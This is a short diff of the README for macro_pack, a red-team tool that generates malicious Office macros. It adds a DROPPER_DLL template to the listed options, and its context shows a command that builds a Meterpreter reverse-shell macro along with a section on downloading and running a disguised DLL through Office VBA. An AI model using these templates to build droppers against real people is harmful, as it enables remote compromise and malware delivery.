@@ -199,7 +199,7 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
         Note that macro_pack will automatically detect AutoOpen, Workbook_Open, or Document_Open  as the start function
         
     -t, --template=TEMPLATE_NAME    Use VBA template already included in macro_pack.exe.
-        Available templates are: HELLO, CMD, DROPPER, DROPPER2, DROPPER_PS, METERPRETER, EMBED_EXE 
+        Available templates are: HELLO, CMD, DROPPER, DROPPER2, DROPPER_PS, DROPPER_DLL, METERPRETER, EMBED_EXE 
         Help for template usage: macro_pack.exe -t help
          
          
@@ -287,7 +287,7 @@ Give this template the url of the powershell script you want to run
  
  
 ### DROPPER_DLL
-Download a DLL with another extension and run it using Office VBA 
+Download a DLL with another extension and run it using Office VBA  
   -> Example, load meterpreter DLL using Office:  
 ```batch
 REM Generate meterpreter dll payload
